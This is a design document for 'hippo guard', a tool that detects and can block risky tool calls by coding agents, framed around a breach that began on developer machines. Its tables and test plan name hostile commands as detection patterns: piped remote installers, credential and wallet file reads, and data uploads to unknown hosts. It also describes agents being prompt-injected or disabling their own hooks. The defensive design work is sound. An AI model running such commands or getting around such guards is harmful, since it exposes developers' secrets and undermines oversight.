@@ -1,0 +1,254 @@
+# Guard: noticing, and sometimes stopping, risky agent actions
+
+Status: accepted; Part A ships in v0.5.0, Part B is planned for v0.6.0 ([rollout](#rollout)). Revised 12 November 2026. Shared rules (version floor, local accept, hardening gate, release plan) are in [common.md](common.md).
+
+## The problem
+
+Coding agents run shell commands, install packages, clone repositories and fetch web pages on developer machines that hold SSH keys, cloud credentials, deploy tokens and sometimes wallets. On 29 October 2026 attackers took about $6.3 billion from Binance. Binance's incident report, published on 3 November and relayed by the sources below, describes this chain:
+
+1. **June.** A wallet DevOps engineer (A) was looking for an AI coding tool through a search engine and installed a tampered Homebrew. Binance detected an anomaly, replaced the device and rotated credentials. Palo Alto Networks says a poisoned search ad led to a spoofed site that had the person paste one `zsh` command, which installed a credential stealer. That delivery detail is Palo Alto's account; Binance's report, as quoted, does not give it.
+2. **September.** A second engineer (B), approached by a fake recruiter, ran a "coding assignment" repository on a work computer. According to BleepingComputer's quotes from the report, it ran during setup, replaced a `pyenv` file in the Homebrew directory, and opened a shell that took commands from the attacker's server. Endpoint security did not catch it.
+3. **20 October.** From B's machine, the attacker used an **internal AI tool** to take over A's machine and a third wallet engineer's machine, and found a container deployment token on A's machine. Binance has not named the tool or said what permissions it had.
+4. **29 October.** The attacker used the token to deploy a container that reached the wallet signing service.
+
+Sources: The Block, "Binance says hackers used fake job interview, internal AI tool in $6.3 billion breach", 3 Nov 2026, <https://www.theblock.co/news/business/2026-11-03-binance-hack-incident-report-north-korea-fake-job-interview-ai-tool-432406>; CNBC, "Binance co-CEO Richard Teng says hackers used fake job interviews…", 3 Nov 2026, <https://www.cnbc.com/2026/11/03/binance-co-ceo-teng-says-hackers-used-fake-job-interviews-to-steal-6point3-billion-in-crypto.html>; BleepingComputer, "Binance says fake job interview led to $6.3 billion crypto heist", 3 Nov 2026, <https://www.bleepingcomputer.com/news/security/binance-says-fake-job-interview-led-to-63-billion-crypto-heist/>; StepSecurity, "Binance's $6.34 Billion Hack: Developer Machines, AI Tooling, and Wallet Signing", 30 Oct, updated 3 Nov 2026, <https://www.stepsecurity.io/blog/binance-hack-developer-machine-security>; Palo Alto Networks, "How a Developer Endpoint Became the Path to Binance's $6.3B Heist", 9 Nov 2026, <https://www.paloaltonetworks.com/blog/?p=372557>; SecurityWeek, "Rigged coding assignment abused AI tool opened path to $6 billion Binance heist", <https://securityweek.com/rigged-coding-assignment-abused-ai-tool-opened-path-to-6-billion-binance-heist> (only its summary was read). Binance's own post, <https://www.binance.com/en/blog/community/3229153443759566763>, could not be fetched when this was written; its wording here comes through the sources above.
+
+**None of these steps was an agent's own mistake.** People ran the first two, and the attacker drove the AI tool in the third from a machine they already controlled. That limits what any tool reading agent transcripts could have done here, and this document says so step by step ([below](#what-hippo-could-and-could-not-have-done-in-this-case)).
+
+The incident still shows three things hippo is positioned to help with:
+
+- Agents now run the same kinds of commands people were tricked into running: a one-line installer from a web page, setup scripts of a repository just cloned, reads of credential files. An agent can be talked into them by text in a page, an issue or a README (prompt injection), or can choose them because they look like the quickest fix.
+- An agent on a workstation is a tool with execution rights. Whoever controls the machine, or the text the agent reads, can use it.
+- hippo already reads every session of every agent on the machine, and already has hooks or plugins inside three of them. It sees much of what agents do. What it lacks is rules about these risks.
+
+### What hippo has today
+
+- **Incidents** (`hippo incidents`) built from transcripts with rules and no model call: corrections, blocked and failed steps, redone work, collisions between sessions, and destructive commands (`rm -rf` outside build folders, `git reset --hard`, force pushes, `DROP TABLE`, …). Each is shown with evidence a person can check in ten seconds.
+- For a destructive pattern, `incidents` **prints** a Claude Code `PreToolUse` hook script and the settings entry that would have blocked it, for the person to copy. hippo never installs it.
+- The hooks hippo installs are `SessionStart`, `UserPromptSubmit` and `SessionEnd` in Claude Code, and its plugin installs only `SessionStart`. The dsh and OpenCode plugins add the start block and two tools. Codex gets `SessionStart`, `UserPromptSubmit` and `SessionEnd` hooks in 0.4.0 ([codex-hooks.md](codex-hooks.md)). **None of them sees a tool call before it runs.** A guard is new hook work, not a rule added to existing hooks.
+
+## Goals
+
+- **After the fact:** new incident kinds, found in the transcripts hippo already reads, with no model call, for each agent hippo reads.
+- **Before the fact:** an optional, machine-wide guard in each agent that has a pre-tool hook, which warns, asks the person, or blocks a risky call, wherever the session runs.
+- **Rules a team keeps** as a reviewed note in the repository, layered over the person's own machine rules, where loosening any rule needs a local accept on each machine.
+- **Measured false positives** before a rule is switched on, on the person's own history, locally.
+- A clear statement of the limits, and of what hippo must never do since it is itself a target.
+
+## Non-goals
+
+- Malware detection, endpoint protection, network filtering or sandboxing. hippo looks at the text of tool calls; it does not watch processes, files or sockets.
+- Guarding what a person types in their own terminal. hippo sees agents, not shells.
+- Being a security boundary. A guard inside the agent's own process tree can be removed by anything that controls the machine.
+- Calling a model to judge a command. The guard has to answer in milliseconds, give the same answer every time, and stay out of reach of prompt injection.
+
+## Design
+
+### Part A: after the fact, from transcripts
+
+New signal kinds, computed when the rollup is refreshed, from redacted index text, in the style of today's destructive-command signal. The shell parser that `incidents` and the x-ray already use (`xray/shell.rs`: simple commands, `cd`, variable assignments, pipelines) is extended where needed. Each rule prefers precision to recall: a missed case is acceptable, a noisy view gets ignored.
+
+| Kind | Fires on | Evidence shown | Ships |
+|---|---|---|---|
+| `remote-script` | A shell call that pipes a download into an interpreter: `curl …\| sh`, `wget -O- … \| bash`, `bash <(curl …)`, `sh -c "$(curl …)"`, `python - < <(curl …)`, `iex (irm …)`; also `brew tap <user/repo>`, `brew install <url>` and `npm i -g` / `pip install` from a URL or git address. Hosts on the [allow list](#allow-lists-and-layers) do not fire. | The command and its host | v0.5.0 |
+| `fresh-clone-exec` | In one session, a clone or download of a repository (`git clone`, `gh repo clone`, a `.zip`/`.tar` fetch and unpack), then a command run inside it that executes the repository's code: `npm/pnpm/yarn/bun install` (lifecycle scripts), `pip install .`/`-e .`, `python setup.py`, `make`, `./configure`, a `*.sh` in it, `cargo build`/`run` (build scripts), `go generate`, `docker build`. An origin on the allow list does not fire. | The clone, the command, the time between them | v0.5.0 |
+| `credential-read` | A read of a credential path by a read tool or a shell command (`cat`, `cp`, `tar`, `base64`, `scp`, `grep`, …): `~/.ssh/` (not `*.pub` or `known_hosts`), `~/.aws/credentials`, `~/.config/gcloud/`, `~/.azure/`, `~/.kube/config`, `~/.docker/config.json`, `~/.netrc`, `~/.npmrc`, `~/.pypirc`, `~/.git-credentials`, `~/Library/Keychains/`, `security find-*-password -w`, browser profile folders, and known wallet locations (Electrum, Exodus, Ledger Live, `keystore/UTC--*`, wallet browser-extension folders). | The tool and path, never the result | v0.5.0 |
+| `guard-bypass` | A write by an agent's tool to a file that turns hooks off or changes hippo's state: `.claude/settings*.json`, `<account>/settings.json`, `~/.codex/hooks.json`, `config.toml` hook entries, `~/.cursor/hooks.json`, `~/.gemini/settings.json`, the dsh profile patch, `opencode.json` plugins, the guard note, `$HIPPO_HOME/config.toml`, `$HIPPO_HOME/bin-path`, anything under `$HIPPO_HOME/guard/` or `$HIPPO_HOME/accepted/`; also `hippo hooks uninstall` and `hippo accept` run by an agent. `hippo hooks install` and `hippo mcp install` run by an agent do not fire: hippo writing its own entry is not a bypass. | The edit or command | v0.5.0 |
+| `unknown-egress` | A shell call that **sends** data to a host not on the allow list: `curl`/`wget` with `-d @file`, `--data-binary`, `-F`, `-T`, `--upload-file` or a body from command substitution; `scp`/`rsync`/`sftp` to a remote; `nc host port < file`. Reading from an unknown host is not counted. | The command and host | later |
+| `command-from-fetched` | A shell command at least 20 characters long that occurs word for word in a web fetch result, a file read from outside the workspace, or an issue or PR body fetched with `gh` earlier in the same session, and that also matches one of the kinds above. | The fetch and the command, side by side | later |
+| `secret-to-model` | Redaction replaced a secret-kind match in a turn the model saw. | The kind and the turn, never the value. Designed in [secrets.md](secrets.md#detection-secret-to-model) | v0.5.0 |
+
+`command-from-fetched` is the narrow, checkable form of "the agent followed instructions it found in fetched content": a risky command copied character for character from text the agent had just read from outside the workspace. The evidence is two excerpts a person can compare.
+
+All kinds appear in `hippo incidents`, Fleet's incident counts, the x-ray of the session and Hippo.app's Incidents panel, per agent (Claude Code, Codex, Cursor, Gemini CLI, dsh, OpenCode, Muse and Command Code: every adapter hippo has). They need no hook. Like every incident, they work only for agents whose transcripts hippo reads, and only on what the transcript records: a command's text, not what it did.
+
+In v0.5.0 Part A uses hippo's built-in allow list only (Homebrew's installer, rustup, hippo's own installer, and the like). Machine and team allow lists arrive with Part B in v0.6.0, and from then on Part A uses the same [layers](#allow-lists-and-layers) as the guard: the machine's list, plus the list of the workspace that contains the session's working directory, if any.
+
+### Part B: before the fact, a guard in the agent
+
+`hippo guard check` reads one pending tool call as JSON on stdin and prints a decision. Each agent's hook calls it by absolute path ([common.md, rule 4](common.md#rule-4-the-hardening-gate)).
+
+**Machine-wide.** The threat this guard is for includes a repository cloned into `~/Downloads` and set up by an agent there: the coding-assignment case. A hook installed in one workspace never sees that session. So the guard is installed per agent account, not per workspace:
+
+| Agent | Hook point | Can ask the person | Install |
+|---|---|---|---|
+| Claude Code | `PreToolUse`, matcher `Bash\|Read\|Write\|Edit\|MultiEdit\|WebFetch\|mcp__.*` | yes (`permissionDecision: "ask"`) | `hippo guard install` adds one entry to each Claude account's user settings (`<account>/settings.json`, for every account folder hippo finds, each listed and confirmed with `--yes`). Never a workspace's committed `.claude/settings.json`: that would push the guard, `fail = "closed"` and an absolute path onto every teammate. |
+| Codex | `PreToolUse` in `$CODEX_HOME/hooks.json`, beside the hooks of [codex-hooks.md](codex-hooks.md) (seen in the 0.167.2 binary's strings: "Command blocked by PreToolUse hook"; the contract is *unverified*) | *unverified*: Codex also has a `PermissionRequest` event | `hippo guard install --agent codex`, once the contract is checked |
+| dsh | `tools/pre-execute`, a waterfall whose listeners return `allow`, `deny` or `ask`, with the parsed arguments (read from dsh's source, `packages/core/tools/src/index.ts`) | yes (`ask`, which becomes a denial where approvals are not supported) | the dsh plugin's `guard: true` option, in the user-level plugin configuration |
+| OpenCode 2 | `ctx.tool.hook("execute.before")` sees the tool and input; `ctx.permission.hook("evaluate")` can set `deny` with a message (both seen in the 2.2.7 binary; the plugin contract is *unverified*) | through its permission flow, *unverified* | the OpenCode plugin's `guard: true` option, in the user-level configuration |
+
+The plugins call `hippo guard check` as a child process, as they already call `hippo context`. The guard reads only its compiled rules: it does not open the index, the rollup or any note at call time, so a check costs one process start and a few regular expressions (target: under 20 ms; measured in the test plan).
+
+**Decisions.** Each rule has an action:
+
+- `warn`: the call runs. The agent gets a short note in its context (`hippo guard: this sends a file to an unknown host (paste.example). Tell the person.`), and the call is logged.
+- `ask`: the person is asked, in the agent's own approval prompt, with the rule's reason.
+- `block`: the call is refused, and the reason tells the agent to stop and have the person run the command themselves if they want it.
+
+**When nobody can be asked.** An agent running headless (`claude -p`, `codex exec`, a dsh headless profile) or in a mode that skips approvals (Claude Code's `bypassPermissions`, read from the hook payload's permission mode) cannot show a question. There `ask` becomes `block`, and the reason says so. A person who runs agents that way and wants the call through adds an allow entry.
+
+**Precedence.** For one call, every matching rule from every layer is evaluated, and the strictest action wins: `block` over `ask` over `warn`. A rule never lowers another rule's action. Allow entries are not rules: they only stop the built-in kinds that consult them (`remote-script`'s host, `fresh-clone-exec`'s origin, `unknown-egress`'s host). A `match` rule is never silenced by an allow entry.
+
+**Text in reasons.** A reason the agent sees can quote only a host or path, and only if it matches `[A-Za-z0-9._:/~-]{1,200}`; otherwise it says `(host not shown)`. A host name is attacker-chosen text, and a reason is read in hippo's voice.
+
+**Defaults.** In v0.6.0 every team and kind rule acts as `warn`, whatever its configured action, and the self-protection rules below block. The shipped actions that take effect once `ask` and `block` are switched on (later): `credential-read` of SSH private keys, keychains and wallet files, and `remote-script` from a host not on the allow list, start at `ask`; everything else at `warn`. Nothing blocks by default. A team raises actions in its rules note.
+
+**When the guard fails.** If `hippo` is missing, crashes or takes longer than its timeout (default 2 s), the call proceeds (fail open), and the failure is logged and shown by `doctor`. Failing closed would stop every agent whenever hippo breaks, and people would uninstall it. A team that prefers failing closed sets `fail = "closed"`. Either way, the guard is not a security boundary.
+
+### Self-protection
+
+Built-in rules that no note, pack or machine rule can lower, and that block from the first release of the guard:
+
+- an agent's call to `hippo accept`, `hippo guard accept`, `hippo guard allow`, `hippo guard uninstall`, `hippo hooks uninstall`, `hippo lessons share`, or `hippo config set` of a key in [the loosening table](common.md#which-direction-is-loosening) or `share_lessons`;
+- an agent's write, by a file tool or by a shell redirect or `cp`/`mv`/`tee`/`sed -i` the parser recognises, under `$HIPPO_HOME/guard/`, `$HIPPO_HOME/accepted/` or to `$HIPPO_HOME/config.toml`.
+
+Their false positives are zero by design: an agent never needs to accept a loosening for the person. They make the injected-by-text case fail visibly. They do not stop an agent that writes a script to a file and runs it, or edits these files through a language runtime; such attempts show up as `guard-bypass` incidents where the transcript records them. This is the limit [common.md](common.md#rule-3-tightening-takes-effect-at-once-loosening-needs-a-local-accept-on-each-machine) states.
+
+### Rules as a note
+
+The team's rules live in one note the team commits, by default `<notes_dir>/Guard.md`, readable by people and agents like any other note:
+
+````markdown
+---
+type: policy
+---
+# Guard
+
+Agents must not run installers piped from the web, or read credential files.
+Ask the person instead.
+
+```hippo-guard
+[allow]
+hosts = ["raw.githubusercontent.com/Homebrew/", "sh.rustup.rs", "github.com/our-org/"]
+clone_origins = ["github.com/our-org/"]
+
+[[rule]]
+kind = "remote-script"
+action = "block"
+
+[[rule]]
+kind = "unknown-egress"
+action = "ask"
+
+[[rule]]
+name = "prod deploys need a tag"
+match = 'kubectl .*--context[= ]prod'
+action = "block"
+reason = "Production deploys go through CI with a release tag."
+```
+````
+
+Only fenced `hippo-guard` blocks are read, so the rest of the note stays prose. Built-in kinds are defined in hippo's code. A note can change their actions, add allow entries, and add `match` rules (a regular expression over the command, or a path glob for file tools).
+
+### Allow lists and layers
+
+Rules come from four sources, compiled into one rule set in `$HIPPO_HOME/guard/compiled.json`:
+
+1. **Built-ins** in hippo's code, including the self-protection rules and the built-in allow list.
+2. **Machine rules** in `$HIPPO_HOME/guard/machine.toml`, the person's own, in the same format as a `hippo-guard` block. They apply to every session on the machine.
+3. **The workspace's note**, applied only to a session whose working directory is inside the configured workspace or one of its worktrees. A session elsewhere gets layers 1, 2 and 4.
+4. **Packs' rules**, which can only add rules and raise actions, never add allow entries, as a pack's reviewer persona can only add restrictions.
+
+### Changing rules: tighter at once, looser after a local accept
+
+The guard follows [common.md, rule 3](common.md#rule-3-tightening-takes-effect-at-once-loosening-needs-a-local-accept-on-each-machine). When any source changes, hippo compiles the new rule set and compares it with the last accepted one, **whatever source the change came from**: a note edit, a pack update, a hand edit of `machine.toml`, or a new `guard_note` path all go through the same comparison.
+
+- Stricter (a rule added, an action raised, an allow entry removed): takes effect at once.
+- Looser (an allow entry added, an action lowered, a rule removed, any edit to a `match` rule, a change of `guard_note` or `timeout_ms`, `fail` from `closed` to `open`): waits. The accepted set stays in force, and `doctor` says that loosening is waiting.
+
+**One exception to "stricter at once".** A new `match` rule with `ask` or `block` could stop every call (`match = '.*'`): stricter, and a denial of service. When it compiles, hippo runs it over the last 7 days of the person's own history (as `guard test` does). If it would have fired on more than 5% of the calls, it runs as `warn` until accepted, and `doctor` says why.
+
+Dreaming cannot write the guard note at all: its proposal validator refuses that path, as it refuses paths outside `notes_dir`.
+
+The `[guard]` table and `guard_note` raise `min_hippo_version` ([common.md, rule 2](common.md#rule-2-security-settings-in-the-shared-hippotoml-need-a-version-floor)), so a teammate's older hippo does not silently ignore `fail = "closed"`.
+
+### False positives
+
+- **Before turning a rule on:** `hippo guard test [--days 30]` runs the compiled rules over the person's own indexed history and prints, per rule, how many calls it would have warned on, asked about or blocked, with examples. It is local and makes no model call. This measurement decides a rule's default action.
+- **When it fires:** the reason names the rule and the exact command to allow it (`hippo guard allow host paste.example`), for the person to run. The command prints the change to the note or to `machine.toml`; a note change goes through the team's normal review in git, and both need a local accept.
+- **Logging.** Every call that matches a rule (any action) is logged in `$HIPPO_HOME/guard/log.jsonl` (0600): rule, agent, session, decision, and the command after redaction. Calls that match nothing are counted per day, not logged. `hippo incidents` lists a rule the person approved every time it asked over the last 14 days as "always allowed: consider an allow entry".
+
+### What hippo could and could not have done in this case
+
+| Step | Could hippo have seen it? | Could the guard have stopped it? |
+|---|---|---|
+| June: a person pastes a `zsh` one-liner from a spoofed site | Only if an agent ran it. hippo does not see a person's terminal. | No, for the same reason. If an agent had been asked to "install Homebrew" and found the spoofed page, `remote-script` from an unknown host would have asked or blocked. |
+| September: the assignment repo runs malware during setup | If an agent ran the setup: `fresh-clone-exec`, wherever the clone was, because the guard is machine-wide. If a person ran it: no. | Only if an agent ran it, the origin was not on the allow list, and the person read the question and said no. hippo cannot tell a malicious install script from a normal one; it asks about every unfamiliar one, which is why its default is `warn`. |
+| 20 October: the attacker drives an internal AI tool to reach other machines | Only if that tool were an agent hippo reads, and only after the fact: `credential-read`, `unknown-egress`, perhaps `remote-script` on the target machines, if those transcripts survived. | No. The attacker controlled B's machine and could remove or skip any hook there. |
+| 29 October: a stolen deploy token is used | Not unless an agent used it. | No. |
+
+What hippo can do is make the agent paths to these mistakes visible and add a question on the most common ones. It does not protect a workstation from a person who runs malware, or from an attacker who already has code execution.
+
+### hippo as a target
+
+hippo reads every transcript on the machine and runs code inside every agent session it hooks. That makes it worth attacking:
+
+- `index.sqlite` holds redacted text of every session in every project: internal host names, service names, file layouts, people's corrections. Redaction removes known secret patterns, not that map.
+- The hooks run `hippo` on every session start and, with the guard, on every tool call, with the call's full input on stdin. A fake `hippo` earlier on `PATH` would see all of that. The Binance malware replaced a file in the Homebrew directory, which is how such a fake would get there.
+- `hippo add` and the plugins fetch from git.
+
+| Must never | Why |
+|---|---|
+| Hold secret values | It already holds the map; adding the keys would make it the one file to steal. See [secrets.md](secrets.md). |
+| Run code from packs, templates or rules | Guard rules are data compiled by hippo's own code; `match` rules are regular expressions, never commands. |
+| Update itself, or anything, unsigned | No self-update exists. If one is added, it verifies a signature first. |
+| Send anything over the network itself | No HTTP client, as today. |
+| Install a guard silently | `hippo guard install` lists every file it will change and writes only with `--yes`. |
+
+| Must do | When |
+|---|---|
+| `$HIPPO_HOME` 0700, files 0600 | v0.5.0, [common.md, rule 4](common.md#rule-4-the-hardening-gate) |
+| Hooks call hippo by absolute path, from per-person files; plugins read `$HIPPO_HOME/bin-path` | v0.5.0, same |
+| `install.sh` verifies the checksum before it writes; `doctor` checks the hooks' binary against it | v0.5.0, same |
+| Plugin installs pinned to a tag, never a branch | Done in the documented install lines. |
+| Signed and notarised macOS builds (Developer ID) for the CLI and Hippo.app; a signature over the checksum file | Later. The app is signed ad hoc today. A gate for the secrets helper. |
+
+## Data, privacy and security
+
+- The guard reads each pending call's full input, which can contain secrets. It keeps nothing but the log line, redacted before it is written, in a 0600 file. The compiled rules hold no transcript text.
+- The guard decision goes to the agent, and so to the agent's model provider, as any tool result does. It names the rule and a filtered host or path, not file contents.
+- The new incident kinds read redacted index text, as incidents do today. `credential-read` records that a path was read, never what was in the result.
+- Rules in a shared note are visible to anyone with the repository, including the allow list. An allow list tells an attacker which hosts are trusted. That is the same trade-off as any committed allow list.
+
+## What changes in config, CLI and app
+
+- v0.5.0: `hippo incidents` gains `remote-script`, `fresh-clone-exec`, `credential-read`, `guard-bypass` (and `secret-to-model` from [secrets.md](secrets.md)); `--kind <k>` filters.
+- v0.6.0: `hippo guard check` (for hooks), `guard install [--agent claude|codex]`, `guard uninstall`, `guard test`, `guard allow`, `guard status`; `hippo accept` ([common.md](common.md#rule-3-tightening-takes-effect-at-once-loosening-needs-a-local-accept-on-each-machine)); the dsh and OpenCode plugins gain `guard: true`; `.hippo/hippo.toml` gains `guard_note` and `[guard] fail`, `timeout_ms`; `$HIPPO_HOME/guard/machine.toml`; `hippo doctor` gains a `guard` row (installed per agent account, rules compiled, loosening waiting, guard failures in the last day, the hook's binary path and checksum); Hippo.app shows the guard's state per agent in Manage and the accept dialog.
+
+## Test plan
+
+- **Signals:** each rule with positive and negative fixtures, including evasions it is not expected to catch (a script written to a file and then run; base64), recorded as known misses so a change that starts catching them is visible. `hippo hooks install` run by an agent does not fire `guard-bypass`; `hooks uninstall` does.
+- **`guard check`:** JSON in, decision out, for each agent's input shape, with fixtures copied from each agent's documented hook payload. Latency over 1,000 calls on CI hardware; fail if the median exceeds 20 ms.
+- **Precedence:** a `warn` rule and an `ask` rule on one call give `ask`; an allow entry does not silence a `match` rule.
+- **Headless:** `ask` in a payload with a bypass permission mode becomes `block`.
+- **Loosening:** an allow entry added to the note, to `machine.toml` or by a pack has no effect until `hippo accept`; a changed `guard_note` path, a lowered `fail`, a changed `timeout_ms` and an edited `match` rule wait too; a new rule takes effect at once; a new `match = '.*'` block runs as `warn`; `accept` refuses with an agent marker set or without a terminal; dreaming's validator refuses the guard note.
+- **Self-protection:** an agent's `hippo guard accept`, `hippo config set share_lessons …` and a `Write` into `$HIPPO_HOME/guard/` are blocked in warn-only mode.
+- **Layers:** a session in `~/Downloads/x` gets machine rules and not the workspace note; a session inside a worktree of the workspace gets both.
+- **Install:** `guard install` writes each account's user settings and never a workspace `.claude/settings.json`.
+- **Reasons:** a host with control characters or Markdown is shown as `(host not shown)`.
+- **Fail open and closed:** a guard that sleeps past its timeout; a missing binary.
+- **End to end, by hand before a release that changes a hook:** Claude Code, dsh and OpenCode (and Codex once checked) in a scratch `HOME`, each asked by a canned local model to run `curl https://example.invalid/x.sh | sh`; the guard warns (v0.6.0) or asks (later), and the transcript shows it.
+- **`guard test` on synthetic history** with known counts per rule.
+
+## Rollout
+
+Part of the joint plan in [common.md](common.md#release-plan). Every step needs the v0.5.0 hardening gate first.
+
+1. **v0.5.0, Part A:** `remote-script`, `fresh-clone-exec`, `credential-read`, `guard-bypass` for every adapter, with the built-in allow list. Nothing installed, nothing blocked.
+2. **v0.6.0, Part B warn-only, machine-wide:** `guard check`, `guard test`, machine rules, the rules note and the accept path; the self-protection rules; `guard install` for every Claude Code account; then the dsh and OpenCode plugin options; Codex if its hook contract has been checked by then, otherwise in a later release.
+3. **Later:** `ask` and `block` take effect, once `guard test` counts on real history show which defaults are quiet enough.
+4. **Later:** `unknown-egress` and `command-from-fetched`: they need the most tuning.
+
+## Alternatives
+
+- **Install the printed destructive-command hooks automatically.** Each is a separate shell script per pattern with no allow list, no team rules and no measurement. The guard generalises it.
+- **A model judging each command.** Too slow for every call, gives different answers to the same input, and can itself be argued with by the injected text it is judging. Rejected.
+- **A guard per workspace, in the workspace's committed settings.** The first draft of this design. It reaches every teammate whether they chose it or not, carries the installer's absolute path, and never sees a session outside the workspace, which is where a cloned assignment runs. Replaced by a machine-wide install in per-person files.
+- **An OS-level sandbox for agents.** A better control for running untrusted code, and outside what hippo is. Teams should use one for any unfamiliar repository. The guard can recommend it in its `fresh-clone-exec` reason.
+
+## Open questions
+
+1. Codex's `PreToolUse` input and output shape, and whether it can ask the person. Until checked, Codex gets Part A only.
+2. Should `credential-read` of `.env` files in the workspace count? They are read constantly and legitimately. This draft leaves them to the secrets rules in [secrets.md](secrets.md#the-guard-recommends-the-runner).
+3. Is `Guard.md` the right home, or should rules be a file under `.hippo/`, out of agents' reading path? A note is visible to agents, which helps them avoid the actions; it is also writable by them, which is why loosening needs a local accept.
+4. Should hippo's own install line move from `curl | sh` to a signed package or Homebrew tap as the primary install, so its documentation stops teaching the pattern the guard flags?
